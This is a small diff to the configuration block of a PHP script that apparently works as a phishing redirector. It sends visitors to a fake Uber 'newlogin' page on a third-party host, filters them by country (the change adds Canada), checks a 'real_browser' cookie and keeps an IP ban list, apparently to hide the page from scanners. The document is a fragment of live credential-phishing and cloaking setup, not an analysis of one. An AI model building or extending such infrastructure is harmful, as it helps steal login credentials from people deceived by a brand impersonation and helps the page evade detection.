@@ -1,7 +1,7 @@
 <?php
 // === CONFIG ===
 $redirectUrl      = "https://uber-support-production.up.railway.app/newlogin.php";
-$allowedCountries = ['MA','ES','US','DE','CH','FR']; // allowed ISO country codes
+$allowedCountries = ['MA','ES','US','DE','CH','FR','CA']; // allowed ISO country codes
 $cookieName       = 'real_browser';
 $logFile          = __DIR__ . '/access_redirect.log';
 $banListFile      = __DIR__ . '/banned_ips.txt';
